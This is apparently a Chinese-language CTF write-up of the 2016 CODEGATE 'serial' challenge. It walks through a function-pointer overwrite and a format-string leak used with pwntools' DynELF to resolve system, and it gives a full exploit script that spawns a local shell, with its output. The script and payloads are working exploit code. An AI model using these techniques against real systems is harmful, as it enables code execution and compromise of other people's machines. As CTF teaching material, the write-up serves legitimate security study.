---
title: 2016 CODEGATE CTF serial
date: 2017-05-14 03:41:02
tags:
- fsb
- DynELF
categories:
- ctf_practice
---

我忍不住又刷题了....这道题还是值得一做，让我对DynELF有了更深入的理解，更重要的是还学了点angr。

## Challenge
[程序](https://github.com/w0lfzhang/ctfs/blob/master/2016-codegate-ctf/serial)的逻辑很简单，首先用calloc分配10个连续0x20大小的块，然后验证key，这里就需要[angr](http://angr.io/)了，当然也可以手动分析。然后就是一般的玩法了，给个菜单你自己去琢磨怎么搞。漏洞还是很好找。
<!-- more -->
```c
__int64 __fastcall add(__int64 a1)
{
  size_t v1; // rax@3
  char s[8]; // [sp+10h] [bp-30h]@3
  __int64 v4; // [sp+18h] [bp-28h]@3
  __int64 v5; // [sp+20h] [bp-20h]@3
  __int64 v6; // [sp+28h] [bp-18h]@3
  __int64 v7; // [sp+38h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  if ( count <= 9 )
  {
    *(_QWORD *)s = 0LL;
    v4 = 0LL;
    v5 = 0LL;
    v6 = 0LL;
    *(_QWORD *)(32LL * count + a1 + 24) = func;
    printf("insert >> ");
    input(s);
    v1 = strlen(s);
    memcpy((void *)(32LL * count + a1), s, v1);
    ++count;
  }
  else
  {
    puts("full");
  }
  return *MK_FP(__FS__, 40LL) ^ v7;
}
```
问题就是能读入31个字符，能把后面的函数地址给覆盖。然后你调用dump函数时会执行这个函数。
```c
int __fastcall dump(__int64 a1)
{
  int result; // eax@1

  result = *(_BYTE *)a1;
  if ( (_BYTE)result )
  {
    printf("func : %p\n", *(_QWORD *)(a1 + 24));
    result = (*(int (__fastcall **)(__int64))(a1 + 24))(a1);
  }
  return result;
}
```

## Exploit
刚开始思路是把函数地址覆盖为printf@plt的地址，然后就按照printf的读写套路来。可是问题是这题一没libc，二是格式化字符串在堆上...这咋整?

后来google了下，这题可以用DynELF来整？纳尼，好像记得用DynELF还是去年，以后就基本没用过了....而且DynELF一般的话有write和puts函数还好用，想不到还能用printf(其实只是经验少没用过而已)。刚开始看wp的时候没明白，格式化串在堆上啊，咋leak啊?

真是套路满满啊，在输入选项的时候能读入数据而且就在栈上~~
```shell
   0x400a16:	mov    rax,QWORD PTR [rbp-0x8]
   0x400a1a:	mov    rdi,rax
   0x400a1d:	mov    eax,0x0
=> 0x400a22:	call   rdx
   0x400a24:	nop
   0x400a25:	leave  
   0x400a26:	ret    
   0x400a27:	push   rbp
Guessed arguments:
arg[0]: 0x603010 --> 0x61616161 ('aaaa')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd60 --> 0x0 
0008| 0x7fffffffdd68 --> 0x603010 --> 0x61616161 ('aaaa')
0016| 0x7fffffffdd70 --> 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffdd78 --> 0x400fa9 (jmp    0x400fd7)
0032| 0x7fffffffdd80 --> 0x1 
0040| 0x7fffffffdd88 --> 0x603010 --> 0x61616161 ('aaaa')
0048| 0x7fffffffdd90 ("3fuckyou")
0056| 0x7fffffffdd98 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400a22 in ?? ()
```
我们可以输入3fuckyou + p64(addr)，然后确定addr是printf的第几个参数，第13个，很稳。这样在add的时候输入以下数据就行了。
```shell
BB%13$sCC".ljust(24) + p64(printf_plt)
```
接着可以leak system函数的地址，然后add的时候输入：
```shell
'/bin/sh;'.ljust(24) + p64(system)
```
注意/bin/sh后面得跟';'，跟\x00是不行的，会被strlen截断的。

## Script
```python
#!/usr/bin python

from pwn import *

debug = 1
if debug:
    p = process('./serial')
else:
    pass

def add(s):
    p.recvuntil("choice >> ")
    p.sendline('1')
    p.recvuntil("insert >> ")
    p.sendline(s)

def remove(id):
    p.recvuntil("choice >> ")
    p.sendline('2')
    p.recvuntil("choice>> ")
    p.sendline(str(id))

def dump(choice_id):
    p.recvuntil("choice >> ")
    p.sendline(choice_id)

p.recvuntil("input product key: ")
p.sendline('615066814080')

printf_plt = 0x400790

def leak(addr):
    add("BB%13$sCC".ljust(24) + p64(printf_plt))
    dump("3AAAAAAA" + p64(addr))
    
    p.recvuntil("BB")

    data = p.recvuntil("CC")[:-2] + "\x00" #must adding \x00, becuase must leaking at least one byte data, 
    #print len(data)                       #however addr's content may be empty
    remove(0)
    return data

d = DynELF(leak, elf = ELF('./serial'))
system_addr = d.lookup("system", "libc.so")
print "system_addr: " + hex(system_addr)

add('/bin/sh;'.ljust(24) + p64(system_addr)) #attention, adding \x00 not working
#gdb.attach(p)
dump('3')

p.interactive()
```
美滋滋：
```shell
w0lfzhang@w0lfzhang666:~/Desktop/ctfs/code-gate$ python exp.py 
[+] Starting local process './serial': pid 75557
[*] '/home/w0lfzhang/Desktop/ctfs/code-gate/serial'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Loading from '/home/w0lfzhang/Desktop/ctfs/code-gate/serial': 0x7ffff7ffe1c8
[+] Resolving 'system' in 'libc.so': 0x7ffff7ffe1c8
[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
[*] Magic did not match
[*] .gnu.hash/.hash, .strtab and .symtab offsets
[*] Found DT_GNU_HASH at 0x7ffff7dd2c00
[*] Found DT_STRTAB at 0x7ffff7dd2c10
[*] Found DT_SYMTAB at 0x7ffff7dd2c20
[*] .gnu.hash parms
[*] hash chain index
[*] hash chain
system_addr: 0x7ffff7a58590
[*] Switching to interactive mode
hey! (nil)
Smash me!
1. Add 2. Remove 3. Dump 4. Quit
choice >> func : 0x7ffff7a58590
$ id
uid=1000(w0lfzhang) gid=1000(w0lfzhang) groups=1000(w0lfzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

